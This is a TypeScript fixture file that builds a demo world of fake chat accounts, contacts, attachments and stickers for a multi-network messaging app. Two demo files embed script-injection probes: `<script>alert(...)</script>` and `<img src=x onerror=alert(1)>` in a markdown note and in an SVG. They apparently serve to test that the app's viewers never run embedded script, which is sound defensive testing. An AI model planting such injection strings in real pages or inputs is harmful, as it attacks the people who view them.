/**
 * Demo world: six in-process adapters (two Discord accounts, Signal, Matrix, WhatsApp, Telegram)
 * that emit the same facts real adapters do, so the whole pipeline (dedupe,
 * person merging, triage, folders) runs on realistic data.
 *
 * Native ids are shaped like the real thing (snowflakes, UUIDs, !room:server)
 * so the source panels look right. Timestamps are relative to an epoch fixed at
 * first seed and stored in the account config.
 */

import { existsSync, readFileSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import type * as P from '@dither-chat/protocol';
import { ABOUT_LABEL as P_ABOUT_LABEL, BIO_LIMIT as P_BIO_LIMIT, NETWORK_META } from '@dither-chat/protocol';
import { hubId } from '@dither-chat/protocol/ids';
import type { AccountRow, Store } from './store.ts';
import { DEMO_SELF_CAPS, DemoSelf } from './demoself.ts';
import type { InprocAdapter } from './supervisor.ts';
import { fillMailbox, GMAIL, type FakeInput, type FakeMailBackend } from './mail/fake.ts';
import { demoFileBytes, seedHtmlMail } from './mail/demo-html.ts';
import { DEMO_SERVER_CAPS, DemoServers } from './demoservers.ts';
import { DEMO_THREAD_CAPS, DemoThreads } from './demothreads.ts';

type AccKey = 'dmain' | 'dalt' | 'sig' | 'mx' | 'wa' | 'tg';

/**
 * DITHER_DEMO_SCENARIO=multiaccount adds Kit, one person on seven accounts across five networks, talking with several
 * of yours (eight pairs), and Mo, two Discord accounts of theirs talking with one of yours, and names your demo
 * accounts by their usernames. Off by default: the default world's counts
 * are what the tests and perf baselines expect.
 */
export const MULTI_ACCOUNT = (process.env.DITHER_DEMO_SCENARIO ?? '').split(',').includes('multiaccount');
const named = (plain: string, username: string) => (MULTI_ACCOUNT ? username : plain);

export const DEMO_ACCOUNTS: { key: AccKey; id: string; network: P.Network; label: string; color: string }[] = [
  { key: 'dmain', id: 'acc_demo-discord-main', network: 'discord', label: named('main', 'zyansheep'), color: '#F2A541' },
  { key: 'dalt', id: 'acc_demo-discord-alt', network: 'discord', label: named('alt', 'zyn.alt'), color: '#E86A92' },
  { key: 'sig', id: 'acc_demo-signal', network: 'signal', label: named('personal', 'zyan.01'), color: '#B794F6' },
  { key: 'mx', id: 'acc_demo-matrix', network: 'matrix', label: named('matrix.org', '@zyansheep'), color: '#FF8C61' },
  { key: 'wa', id: 'acc_demo-whatsapp', network: 'whatsapp', label: named('personal', 'zyan'), color: '#7FD1AE' },
  { key: 'tg', id: 'acc_demo-telegram', network: 'telegram', label: named('personal', '@zyansheep'), color: '#5CC8FF' },
];

// ------------------------------------------------------------------ id shapes

const h = (s: string) => new Bun.CryptoHasher('sha256').update(s).digest();
const snow = (k: string) => (BigInt('0x' + h('d' + k).toString('hex').slice(0, 15)) % 900000000000000000n + 1000000000000000000n).toString();
const uuid = (k: string) => {
  const x = h('s' + k).toString('hex');
  return `${x.slice(0, 8)}-${x.slice(8, 12)}-4${x.slice(13, 16)}-a${x.slice(17, 20)}-${x.slice(20, 32)}`;
};
const room = (k: string, server: string) => `!${h('m' + k).toString('base64url').slice(0, 18)}:${server}`;
const event = (k: string) => `$${h('e' + k).toString('base64url').slice(0, 43)}`;

// ------------------------------------------------------------------ people

const did = (k: string, handle: string, displayName: string, x: Partial<P.IdentityFact> = {}): P.IdentityFact => ({ nativeId: snow(k), handle, displayName, ...x });
const D = {
  zyan: did('zyan', 'zyansheep', 'zyan'),
  zyn: did('zyn', 'zyn.alt', 'zyn'),
  alice: did('alice', 'alice.chen', 'Alice', { contact: true }),
  ravi: did('ravi', 'ravi_p', 'Ravi', { contact: true }),
  jordan: did('jordan', 'jordanruns', 'Jordan', { contact: true }),
  theo: did('theo', 'theo.k', 'Theo', { contact: true }),
  quinn: did('quinn', 'quinn.dev', 'Quinn', { contact: true }),
  lev: did('lev', 'lev', 'Lev'),
  pixelfox: did('pixelfox', 'pixelfox', 'pixelfox'),
  ci: did('ci', 'dither-ci', 'dither-ci', { isBot: true }),
  ferris: did('ferris', 'ferris', 'Ferris', { isBot: true }),
  mara: did('mara', 'mara', 'Mara'),
  owl: did('owl', 'oxidized_owl', 'owl'),
  tim: did('tim', 'tokio_tim', 'Tim'),
  bea: did('bea', 'borrowck', 'Bea'),
  hannah: did('hannah', 'helpful_hannah', 'Hannah'),
  gorb: did('gorb', 'gorb', 'Gorb'),
  pat: did('pat', 'pantheon_pat', 'Pat'),
  shade: did('shade', 'shade.skip', 'Shade'),
  // Asks to be friends (docs/add.md).
  nova: did('nova', 'nova.wav', 'Nova'),
  // Ask the alt account to be friends, flagged by Discord: one as possible spam, one who shares nothing with it.
  drops: did('drops', 'free.nitro.drops', 'Nitro Drops'),
  wren: did('wren', 'wren.fm', 'Wren'),
};
const sid = (k: string, phone: string, displayName: string, contact = true): P.IdentityFact => ({ nativeId: uuid(k), handle: phone, displayName, contact });
const S = {
  self: sid('self', '+1 555 0100', 'zyan', false),
  alice: sid('alice', '+1 555 0137', 'Alice Chen'),
  mom: sid('mom', '+1 555 0102', 'Mom'),
  dad: sid('dad', '+1 555 0103', 'Dad'),
  mei: sid('mei', '+1 555 0177', 'Mei'),
  sam: sid('sam', '+1 555 0161', 'Sam Rivera'),
  priya: sid('priya', '+1 555 0149', 'Priya'),
  theo: sid('theo', '+1 555 0122', 'Theo K'),
  quinn: sid('quinn', '+1 555 0190', 'Quinn'),
  lev: sid('lev', '+1 555 0118', 'Lev'),
  // Not a contact: their first message waits as a message request (docs/add.md).
  jamie: sid('jamie', '+1 555 0199', 'Jamie', false),
};
const wid = (phone: string, displayName: string, contact = true): P.IdentityFact => ({ nativeId: `${phone}@s.whatsapp.net`, handle: `+${phone}`, displayName, contact });
const W = {
  self: wid('15550100', 'zyan', false),
  alice: wid('15550137', 'Alice Chen'),
  nana: wid('442071830042', 'Nana'),
  marco: wid('393471112233', 'Marco'),
  ines: wid('34611222333', 'Inês'),
  hoa: wid('15550188', 'Hoa (garden swap)', false),
};
const wgroup = (k: string) => `120363${BigInt('0x' + h('w' + k).toString('hex').slice(0, 12)).toString().padStart(12, '0').slice(0, 12)}@g.us`;
const mid = (user: string, displayName: string, x: Partial<P.IdentityFact> = {}): P.IdentityFact => ({ nativeId: user, handle: user, displayName, ...x });
const M = {
  // Multi-account: your accounts' own names differ a little, as people's do (docs/chats.md "Names").
  self: mid('@zyansheep:matrix.org', named('zyan', 'zyansheep')),
  alice: mid('@alicechen:matrix.org', 'Alice Chen', { contact: true }),
  kai: mid('@kai:nixos.dev', 'kai', { contact: true }),
  sam: mid('@samr:matrix.org', 'Sam Rivera', { contact: true }),
  lina: mid('@lina:nixos.dev', 'Lina'),
  bort: mid('@bort:matrix.org', 'bort'),
  nixbot: mid('@nixbot:nixos.dev', 'NixOS Bot', { isBot: true }),
  ferrous: mid('@ferrous:matrix.org', 'ferrous'),
  mira: mid('@mira:matrix.org', 'Mira'),
  jules: mid('@jules:matrix.org', 'Jules'),
  noor: mid('@noor:matrix.org', 'Noor'),
  ben: mid('@ben:matrix.org', 'Ben'),
};
/** Telegram: numeric user ids, @usernames as handles. */
const tid = (k: string, username: string, displayName: string, contact = true): P.IdentityFact => ({ nativeId: String(100_000_000 + (h('t' + k).readUInt32BE(0) % 6_000_000_000)), handle: `@${username}`, displayName, contact });
const TG = {
  self: tid('self', 'zyansheep', named('zyan', 'zyan s.'), false),
  alice: tid('alice', 'alicechen', 'Alice Chen'),
  noor: tid('noor', 'noor_h', 'Noor'),
  lena: tid('lena', 'lena_k', 'Lena K', false),
  // Blocked (docs/add.md "Relationships").
  spam: tid('spam', 'crypto_signals_vip', 'Crypto Signals VIP', false),
};
/**
 * Profile pictures for the multi-account scenario, each a different shape as well as colour, so pictures greyed out
 * for an account not in focus can still be told apart.
 */
const pfp = (bg: string, body: string) =>
  `data:image/svg+xml;utf8,${encodeURIComponent(`<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64"><rect width="64" height="64" fill="${bg}"/>${body}</svg>`)}`;
const PFP = {
  // Yours.
  sheep: pfp('#F7D154', `<g fill="#fff"><circle cx="22" cy="34" r="11"/><circle cx="32" cy="27" r="12"/><circle cx="42" cy="34" r="11"/><circle cx="32" cy="40" r="12"/></g><ellipse cx="32" cy="36" rx="8" ry="10" fill="#2b2b33"/><circle cx="29" cy="34" r="1.8" fill="#fff"/><circle cx="35" cy="34" r="1.8" fill="#fff"/><rect x="26" y="49" width="4" height="9" fill="#2b2b33"/><rect x="34" y="49" width="4" height="9" fill="#2b2b33"/>`),
  invader: pfp('#FF6B6B', `<g fill="#3a1420">${[[20, 16], [40, 16], [24, 20], [36, 20], [20, 24], [24, 24], [28, 24], [32, 24], [36, 24], [40, 24], [16, 28], [20, 28], [28, 28], [32, 28], [40, 28], [44, 28], [12, 32], [16, 32], [20, 32], [24, 32], [28, 32], [32, 32], [36, 32], [40, 32], [44, 32], [48, 32], [12, 36], [20, 36], [24, 36], [28, 36], [32, 36], [36, 36], [40, 36], [48, 36], [12, 40], [20, 40], [40, 40], [48, 40], [24, 44], [28, 44], [32, 44], [36, 44]].map(([x, y]) => `<rect x="${x}" y="${y}" width="4" height="4"/>`).join('')}</g>`),
  peak: pfp('#9ec5e8', `<circle cx="46" cy="18" r="8" fill="#fff4c2"/><path d="M0 52 L20 26 L30 38 L42 22 L64 50 L64 64 L0 64Z" fill="#3d4f6b"/><path d="M20 26 L25 32 L17 32Z M42 22 L48 30 L37 29Z" fill="#fff"/>`),
  rings: pfp('#FF8C61', `<g fill="none" stroke="#4a1f0e" stroke-width="4"><circle cx="32" cy="32" r="22"/><circle cx="32" cy="32" r="13"/></g><circle cx="32" cy="32" r="5" fill="#4a1f0e"/>`),
  moon: pfp('#1f2a4a', `<circle cx="34" cy="30" r="16" fill="#f3e9c6"/><circle cx="41" cy="25" r="14" fill="#1f2a4a"/><g fill="#f3e9c6"><circle cx="14" cy="14" r="1.5"/><circle cx="50" cy="48" r="1.5"/><circle cx="20" cy="50" r="1"/></g>`),
  leaf: pfp('#5CC8FF', `<path d="M14 50 C 14 22, 34 12, 52 12 C 52 32, 42 52, 14 50Z" fill="#1d5c3a"/><path d="M14 50 L44 20" stroke="#a7e3b8" stroke-width="2.5"/>`),
  // Kit's.
  cat: pfp('#7c5cff', `<path d="M16 22 L22 8 L30 20 L34 20 L42 8 L48 22 C 52 30, 50 48, 32 50 C 14 48, 12 30, 16 22Z" fill="#f2a541"/><circle cx="25" cy="32" r="3" fill="#2b2b33"/><circle cx="39" cy="32" r="3" fill="#2b2b33"/><path d="M29 39 L35 39 L32 42Z" fill="#e86a92"/>`),
  sword: pfp('#5a1b24', `<path d="M44 10 L54 10 L54 20 L28 46 L18 36Z" fill="#cfd6e0"/><path d="M14 34 L30 50 L26 54 L10 38Z" fill="#c8a24a"/><rect x="6" y="48" width="12" height="7" transform="rotate(-45 12 51)" fill="#7a4b2a"/>`),
  suit: pfp('#8a94a6', `<circle cx="32" cy="24" r="11" fill="#e8c9a8"/><path d="M8 64 C 10 44, 22 38, 32 38 C 42 38, 54 44, 56 64Z" fill="#273042"/><path d="M28 38 L32 50 L36 38Z" fill="#fff"/><path d="M31 41 L33 41 L34 50 L32 53 L30 50Z" fill="#c0392b"/><path d="M21 22 C 21 12, 43 12, 43 22 C 40 16, 26 16, 21 22Z" fill="#3b2a20"/>`),
  lake: pfp('#f2a07b', `<circle cx="32" cy="34" r="12" fill="#ffd36e"/><rect y="34" width="64" height="30" fill="#2f5d7c"/><g stroke="#ffd36e" stroke-width="2"><line x1="22" y1="40" x2="42" y2="40"/><line x1="26" y1="45" x2="38" y2="45"/><line x1="29" y1="50" x2="35" y2="50"/></g><path d="M0 34 L10 22 L16 30 L22 24 L28 34Z" fill="#26313f"/>`),
  catline: pfp('#0dbd8b', `<path d="M16 24 L20 10 L28 20 L36 20 L44 10 L48 24 C 50 36, 44 48, 32 48 C 20 48, 14 36, 16 24Z" fill="none" stroke="#06382a" stroke-width="4" stroke-linejoin="round"/><path d="M24 32 L28 32 M36 32 L40 32" stroke="#06382a" stroke-width="3" stroke-linecap="round"/>`),
  flake: pfp('#5277c3', `<g stroke="#e6eefc" stroke-width="5" stroke-linecap="round">${[0, 60, 120].map((r) => `<line x1="32" y1="12" x2="32" y2="52" transform="rotate(${r} 32 32)"/>`).join('')}</g><circle cx="32" cy="32" r="6" fill="#5277c3" stroke="#e6eefc" stroke-width="3"/>`),
  // Mo's.
  code: pfp('#263238', `<path d="M24 20 L12 32 L24 44 M40 20 L52 32 L40 44" fill="none" stroke="#7fd1ae" stroke-width="5" stroke-linecap="round" stroke-linejoin="round"/><path d="M36 14 L28 50" stroke="#f7d154" stroke-width="4" stroke-linecap="round"/>`),
  brush: pfp('#fff1d6', `<path d="M46 8 L56 18 L30 44 L20 34Z" fill="#7a4b2a"/><path d="M20 34 L30 44 C 26 54, 16 56, 8 56 C 10 48, 10 38, 20 34Z" fill="#e86a92"/><circle cx="48" cy="48" r="5" fill="#5cc8ff"/><circle cx="14" cy="18" r="4" fill="#f2a541"/>`),
  heart: pfp('#ffb3c7', `<path d="M32 52 C 10 38, 8 22, 20 16 C 26 13, 31 17, 32 21 C 33 17, 38 13, 44 16 C 56 22, 54 38, 32 52Z" fill="#b3123f"/><path d="M18 22 C 20 19, 23 18, 25 19" stroke="#fff" stroke-width="3" fill="none" stroke-linecap="round"/>`),
};
/** Kit (MULTI_ACCOUNT): three Discord accounts, Signal, two Matrix accounts on different servers, Telegram. */
const KIT = {
  // Their own names: two say "Kit", here and on Telegram. The network's badge tells those apart, so no handle shows.
  exe: did('kit', 'kit.exe', 'Kit', { contact: true }),
  alt: did('kit-alt', 'kit_alt', 'kit (raid)', { contact: true }),
  work: did('kit-work', 'kit.work', 'Kit Okafor', { contact: true }),
  sig: sid('kit', '+1 555 0144', 'Kit O.'),
  mx: mid('@kit:matrix.org', 'kitty', { contact: true }),
  nix: mid('@kit:nixos.dev', 'kit (nixos)', { contact: true }),
  tg: tid('kit', 'kitkat', 'Kit', true),
};
/** Mo (MULTI_ACCOUNT): two Discord accounts of theirs, both named "Mo", each in a DM with the same one of yours. The
 * names and the network are the same, so a message head adds the handle (`Mo  mo.codes`, `Mo  mo.draws`). */
const MO = {
  main: did('mo', 'mo.codes', 'Mo', { contact: true }),
  art: did('mo-art', 'mo.draws', 'Mo', { contact: true }),
};
if (MULTI_ACCOUNT) {
  const pics: [P.IdentityFact, string][] = [
    [D.zyan, PFP.sheep], [D.zyn, PFP.invader], [S.self, PFP.peak], [M.self, PFP.rings], [W.self, PFP.moon], [TG.self, PFP.leaf],
    [KIT.exe, PFP.cat], [KIT.alt, PFP.sword], [KIT.work, PFP.suit], [KIT.sig, PFP.lake], [KIT.mx, PFP.catline], [KIT.nix, PFP.flake], [KIT.tg, PFP.heart],
    [MO.main, PFP.code], [MO.art, PFP.brush],
  ];
  for (const [who, url] of pics) who.avatarUrl = url;
  Object.assign(D, { kit: KIT.exe, kitAlt: KIT.alt, kitWork: KIT.work, mo: MO.main, moArt: MO.art });
  Object.assign(S, { kit: KIT.sig });
  Object.assign(M, { kit: KIT.mx, kitNix: KIT.nix });
  Object.assign(TG, { kit: KIT.tg });
}
const POOLS: Partial<Record<P.Network, Record<string, P.IdentityFact>>> = { discord: D, signal: S, whatsapp: W, matrix: M, telegram: TG };
const at = (i: P.IdentityFact) => `<@${i.nativeId}>`;

// ------------------------------------------------------------------ files

/** A one-page PDF with a line of text, built so its offsets are right. */
function tinyPdf(text: string): Uint8Array {
  const objs = ['<< /Type /Catalog /Pages 2 0 R >>', '<< /Type /Pages /Kids [3 0 R] /Count 1 >>', '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 420 200] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>'];
  const stream = `BT /F1 16 Tf 30 100 Td (${text}) Tj ET`;
  objs.push(`<< /Length ${stream.length} >>\nstream\n${stream}\nendstream`, '<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>');
  let out = '%PDF-1.4\n';
  const offsets = objs.map((o, i) => {
    const at = out.length;
    out += `${i + 1} 0 obj\n${o}\nendobj\n`;
    return at;
  });
  const xref = out.length;
  out += `xref\n0 ${objs.length + 1}\n0000000000 65535 f \n${offsets.map((o) => `${String(o).padStart(10, '0')} 00000 n \n`).join('')}`;
  out += `trailer\n<< /Size ${objs.length + 1} /Root 1 0 R >>\nstartxref\n${xref}\n%%EOF\n`;
  return new TextEncoder().encode(out);
}

/** A zip of stored (uncompressed) entries, as a phone's "share as zip" makes. For the file viewers (docs/files.md). */
export function storedZip(entries: [name: string, text: string][]): Uint8Array {
  const enc = new TextEncoder();
  const local: Uint8Array[] = [];
  const central: Uint8Array[] = [];
  let at = 0;
  const u16 = (n: number) => [n & 0xff, (n >> 8) & 0xff];
  const u32 = (n: number) => [n & 0xff, (n >> 8) & 0xff, (n >> 16) & 0xff, (n >>> 24) & 0xff];
  for (const [name, text] of entries) {
    const n = enc.encode(name);
    const data = enc.encode(text);
    const crc = Bun.hash.crc32(data);
    const common = [...u16(20), ...u16(0x800), ...u16(0), ...u16(0), ...u16(0x21), ...u32(crc), ...u32(data.length), ...u32(data.length), ...u16(n.length), ...u16(0)];
    local.push(new Uint8Array([0x50, 0x4b, 3, 4, ...common, ...n, ...data]));
    central.push(new Uint8Array([0x50, 0x4b, 1, 2, ...u16(20), ...common, ...u16(0), ...u16(0), ...u16(0), ...u32(0), ...u32(at), ...n]));
    at += 30 + n.length + data.length;
  }
  const cdSize = central.reduce((k, c) => k + c.length, 0);
  const end = new Uint8Array([0x50, 0x4b, 5, 6, ...u16(0), ...u16(0), ...u16(entries.length), ...u16(entries.length), ...u32(cdSize), ...u32(at), ...u16(0)]);
  return new Uint8Array(Buffer.concat([...local, ...central, end]));
}

const text = (s: string) => new TextEncoder().encode(s);

const ROUTING_NOTES = `# Greedy routing notes

Embedding peers into **hyperbolic space** keeps greedy forwarding loop-free, as long as every node knows its
neighbours' coordinates. These are the numbers from the simulator so far.

## Stretch by topology

| topology | nodes | stretch | p99 |
| --- | ---: | ---: | ---: |
| ring | 1k | 1.08 | 1.31 |
| grid | 4k | 1.12 | 1.40 |
| scale-free | 10k | 1.21 | 1.77 |

## Open questions

- [x] ring and grid
- [ ] churn: what happens when a coordinate owner leaves?
- [ ] can a node lie about its coordinate?

> Greedy routing succeeds whenever the embedding is *greedy*: every node has a neighbour closer to the target.

\`\`\`rust
fn next_hop(me: &Coord, peers: &[Peer], to: &Coord) -> Option<PeerId> {
    peers
        .iter()
        .filter(|p| p.coord.dist(to) < me.dist(to))
        .min_by(|a, b| a.coord.dist(to).total_cmp(&b.coord.dist(to)))
        .map(|p| p.id)
}
\`\`\`

Background: [Kleinberg, geographic routing in hyperbolic space](https://example.org/greedy-embedding).
Figure from the paper, not loaded until asked: ![the embedding](https://example.org/figure.png)

Raw HTML is shown, not run: <script>alert('nope')</script> <img src=x onerror=alert(1)>
`;

const STRETCH_CSV = `topology,nodes,stretch,p99,notes
ring,1000,1.08,1.31,
grid,4000,1.12,1.40,"4-neighbour, wraps at the edges"
scale-free,10000,1.21,1.77,"Barabási–Albert, m=3"
small-world,10000,1.17,1.62,"Watts–Strogatz, p=0.1"
`;

const BUILD_LOG = Array.from({ length: 60 }, (_, i) => {
  const t = `2026-11-0${(i % 3) + 4}T12:${String(10 + Math.floor(i / 2)).padStart(2, '0')}:${String((i * 7) % 60).padStart(2, '0')}Z`;
  if (i === 41) return `${t} error[E0308]: mismatched types in doctest \`insert_get\``;
  if (i === 42) return `${t}   --> hashdb/src/lib.rs:88:13`;
  return `${t} ${['Compiling hashdb v0.9.2', 'Compiling dither-core v0.4.0', 'Running unittests src/lib.rs', 'test store::tests::round_trip ... ok', 'Doc-tests hashdb'][i % 5]}`;
}).join('\n') + '\nbuild #482 failed\n';

const INSERT_GET = `//! The doctest that broke #482, fixed.
use hashdb::{HashDb, Key};

/// Inserts a value and reads it back.
///
/// \`\`\`
/// let mut db = hashdb::HashDb::default();
/// let k = db.insert(b"hello".to_vec());
/// assert_eq!(db.get(&k), Some(&b"hello".to_vec()));
/// \`\`\`
pub fn insert_get(db: &mut HashDb, value: Vec<u8>) -> Option<Vec<u8>> {
    let key: Key = db.insert(value);
    // 0.9 returns a reference now; clone for the old signature.
    db.get(&key).cloned()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn round_trip() {
        let mut db = HashDb::default();
        assert_eq!(insert_get(&mut db, vec![1, 2, 3]), Some(vec![1, 2, 3]));
    }
}
`;

const BENCH = JSON.stringify(
  {
    build: 483,
    commit: 'a3f9c21',
    machine: { cpu: 'Ryzen 7 7840U', cores: 16, memoryGiB: 32 },
    results: [
      { name: 'route/greedy/1k', ns: 412, stddev: 9.1 },
      { name: 'route/greedy/10k', ns: 1870, stddev: 33.4 },
      { name: 'dht/bootstrap', ns: 92_400, stddev: 1_210, notes: null },
      { name: 'hashdb/insert', ns: 88, stddev: 1.2 },
    ],
    regressions: [],
    ok: true,
  },
  null,
  2,
);

const TOPOLOGY_SVG = `<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="320" height="200" viewBox="0 0 320 200">
  <script>alert('an SVG is shown as its source, never run')</script>
  <circle cx="60" cy="100" r="18" fill="#7c5cff"/>
  <circle cx="160" cy="50" r="18" fill="#0dbd8b"/>
  <circle cx="260" cy="100" r="18" fill="#ff8c61"/>
  <path d="M60 100 L160 50 L260 100" stroke="#888" fill="none"/>
</svg>
`;

const SIM_ZIP = storedZip([
  ['dither-sim-0.4/', ''],
  ['dither-sim-0.4/README.md', '# dither-sim\n\n10k-node simulations in the browser.\n'],
  ['dither-sim-0.4/index.html', '<!doctype html><title>dither-sim</title><script src="sim.js"></script>\n'],
  ['dither-sim-0.4/sim.js', 'export function step(world) { return world; }\n'],
  ['dither-sim-0.4/topologies/ring.json', '{"nodes":1000}\n'],
  ['dither-sim-0.4/LICENSE', 'MIT\n'],
]);

const RENT_XLSX = storedZip([
  ['[Content_Types].xml', '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>'],
  ['xl/workbook.xml', '<?xml version="1.0"?><workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"/>'],
  ['xl/worksheets/sheet1.xml', '<?xml version="1.0"?><worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"/>'],
]);

/**
 * Demo attachments fetched through fetchMedia, so they are served at /media/ as a network's files are. The types are
 * what a network might say, wrong ones included (Discord calls a .rs file application/rls-services+xml).
 */
const DEMO_FILES: Record<string, { mime: string; bytes: Uint8Array }> = {
  'demo:local-first-chat-sync.pdf': { mime: 'application/pdf', bytes: tinyPdf('Local-first chat sync (demo)') },
  'demo:routing-notes.md': { mime: 'application/octet-stream', bytes: text(ROUTING_NOTES) },
  'demo:stretch.csv': { mime: 'text/csv', bytes: text(STRETCH_CSV) },
  'demo:topology.svg': { mime: 'image/svg+xml', bytes: text(TOPOLOGY_SVG) },
  'demo:build-482.txt': { mime: 'text/plain', bytes: text(BUILD_LOG) },
  'demo:insert_get.rs': { mime: 'application/rls-services+xml', bytes: text(INSERT_GET) },
  'demo:dither-sim-0.4.zip': { mime: 'application/zip', bytes: SIM_ZIP },
  'demo:bench-483.json': { mime: 'application/octet-stream', bytes: text(BENCH) },
  'demo:rent-split.xlsx': { mime: 'application/octet-stream', bytes: RENT_XLSX },
};
/** A demo file as an attachment. */
const file = (key: string, name: string): P.AttachmentFact => ({ kind: 'file', mime: DEMO_FILES[key].mime, name, size: DEMO_FILES[key].bytes.length, url: key });

// ------------------------------------------------------------------ pictures

const svg = (w: number, hgt: number, body: string) =>
  `data:image/svg+xml;utf8,${encodeURIComponent(`<svg xmlns="http://www.w3.org/2000/svg" width="${w}" height="${hgt}" viewBox="0 0 ${w} ${hgt}">${body}</svg>`)}`;
const ART = {
  wall: svg(
    640,
    420,
    `<defs><linearGradient id="g" x1="0" y1="0" x2="1" y2="1"><stop offset="0" stop-color="#3b3f58"/><stop offset="1" stop-color="#1d2030"/></linearGradient></defs>
     <rect width="640" height="420" fill="url(#g)"/><path d="M0 330 L640 250 L640 420 L0 420Z" fill="#14161f"/>
     ${[[120, 300], [170, 240], [230, 205], [300, 160], [350, 120], [420, 95], [470, 60]].map(([x, y]) => `<ellipse cx="${x}" cy="${y}" rx="17" ry="12" fill="#9b6bff"/>`).join('')}
     ${[[90, 120], [520, 300], [560, 140], [260, 330], [400, 260]].map(([x, y]) => `<circle cx="${x}" cy="${y}" r="10" fill="#f2c14e"/>`).join('')}
     <text x="24" y="44" font-family="sans-serif" font-size="22" fill="#e8e6ff" font-weight="700">V4 · purple</text>`,
  ),
  garden: svg(
    640,
    420,
    `<rect width="640" height="420" fill="#cfe8b7"/><rect y="300" width="640" height="120" fill="#6b4f35"/>
     ${[80, 200, 320, 440, 560].map((x) => `<path d="M${x} 300 C ${x - 20} 220, ${x + 20} 180, ${x} 110" stroke="#3f7d3a" stroke-width="8" fill="none"/>`).join('')}
     ${[[70, 170], [95, 220], [205, 150], [190, 235], [330, 185], [310, 140], [450, 210], [430, 160], [570, 190], [555, 240]].map(([x, y]) => `<circle cx="${x}" cy="${y}" r="17" fill="#e5483b"/>`).join('')}`,
  ),
  route: svg(
    640,
    360,
    `<rect width="640" height="360" fill="#0d1018"/><g stroke="#2a3145" stroke-width="1">${Array.from({ length: 16 }, (_, i) => `<line x1="${i * 40}" y1="0" x2="${i * 40}" y2="360"/>`).join('')}</g>
     <path d="M40 300 Q 160 80 260 220 T 460 120 T 600 70" stroke="#f5f5f5" stroke-width="4" fill="none" stroke-dasharray="10 8"/>
     <rect x="300" y="160" width="60" height="18" fill="#c0392b" transform="rotate(-20 330 169)"/>
     <circle cx="600" cy="70" r="10" fill="#ffd166"/><text x="24" y="36" font-family="monospace" font-size="18" fill="#9fb3ff">white palace · saw skip</text>`,
  ),
  whiteboard: svg(
    640,
    400,
    `<rect width="640" height="400" fill="#fbfaf6"/>
     <g font-family="sans-serif" font-size="17" fill="#1d3557"><rect x="40" y="60" width="150" height="60" rx="8" fill="none" stroke="#1d3557" stroke-width="3"/><text x="62" y="96">adapters</text>
     <rect x="250" y="150" width="140" height="70" rx="8" fill="none" stroke="#e63946" stroke-width="3"/><text x="295" y="191">hub</text>
     <rect x="450" y="60" width="150" height="60" rx="8" fill="none" stroke="#1d3557" stroke-width="3"/><text x="488" y="96">PWA</text>
     <rect x="450" y="260" width="150" height="60" rx="8" fill="none" stroke="#2a9d8f" stroke-width="3"/><text x="488" y="296">triage</text>
     <path d="M190 95 L250 175 M390 175 L450 95 M390 200 L450 285" stroke="#1d3557" stroke-width="3"/></g>`,
  ),
  crab: svg(
    480,
    360,
    `<rect width="480" height="360" fill="#ffe8d6"/><ellipse cx="240" cy="210" rx="120" ry="78" fill="#f74c00"/>
     <circle cx="205" cy="150" r="15" fill="#fff"/><circle cx="275" cy="150" r="15" fill="#fff"/><circle cx="205" cy="152" r="7"/><circle cx="275" cy="152" r="7"/>
     <path d="M120 190 Q 60 140 90 100 M360 190 Q 420 140 390 100" stroke="#f74c00" stroke-width="22" fill="none" stroke-linecap="round"/>`,
  ),
};
const img = (url: string, name: string, w: number, hh: number): P.AttachmentFact => ({ kind: 'image', mime: 'image/svg+xml', name, width: w, height: hh, url });

// ------------------------------------------------------------------ places

const SUPER_COLORS = ['#ff7ad9', '#7c5cff', '#4ad7ff'];

/** A small solid badge, so the demo's custom emoji need nothing from the network. */
const badge = (glyph: string, a: string, b: string) =>
  `data:image/svg+xml,${encodeURIComponent(`<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64"><defs><linearGradient id="g" x2="1" y2="1"><stop stop-color="${a}"/><stop offset="1" stop-color="${b}"/></linearGradient></defs><rect width="64" height="64" rx="16" fill="url(#g)"/><text x="32" y="44" font-size="34" text-anchor="middle" font-family="sans-serif" fill="#fff">${glyph}</text></svg>`)}`;

/**
 * Discord stickers as the extractor maps them (dither-accounts, extractors/discord/src/map.ts): a picture, and a Lottie
 * animation (Discord's own stickers are these), each 160 px, in a message of kind 'sticker' with no words.
 */
const STICKER_LOTTIE = {
  v: '5.7.4', fr: 30, ip: 0, op: 60, w: 160, h: 160,
  layers: [{
    ty: 4, ind: 1, ip: 0, op: 60, st: 0,
    ks: {
      o: { a: 0, k: 100 }, r: { a: 0, k: 0 }, p: { a: 0, k: [80, 80, 0] }, a: { a: 0, k: [0, 0, 0] },
      s: { a: 1, k: [
        { t: 0, s: [60, 60, 100], i: { x: [0.5], y: [1] }, o: { x: [0.5], y: [0] } },
        { t: 30, s: [100, 100, 100], i: { x: [0.5], y: [1] }, o: { x: [0.5], y: [0] } },
        { t: 60, s: [60, 60, 100] },
      ] },
    },
    shapes: [{ ty: 'el', p: { a: 0, k: [0, 0] }, s: { a: 0, k: [120, 120] } }, { ty: 'fl', c: { a: 0, k: [0.49, 0.36, 1, 1] }, o: { a: 0, k: 100 } }],
  }],
};
const DEMO_STICKERS: Record<'picture' | 'lottie', P.AttachmentFact> = {
  picture: { nativeId: 'sticker:1100000000000000001', kind: 'image', mime: 'image/png', name: 'Pogo', width: 160, height: 160, url: `data:image/svg+xml,${encodeURIComponent('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 160 160"><circle cx="80" cy="80" r="70" fill="#f2a541"/><text x="80" y="104" font-size="72" text-anchor="middle" font-family="sans-serif" fill="#fff">GG</text></svg>')}` },
  lottie: { nativeId: 'sticker:1100000000000000002', kind: 'image', mime: 'application/x-lottie+json', name: 'Pulse', width: 160, height: 160, url: `data:application/json,${encodeURIComponent(JSON.stringify(STICKER_LOTTIE))}` },
};

const DEMO_EMOJI: P.CustomEmojiFact[] = [
  { key: 'dither:9001', name: 'dither', url: badge('D', '#7c5cff', '#b79bff') },
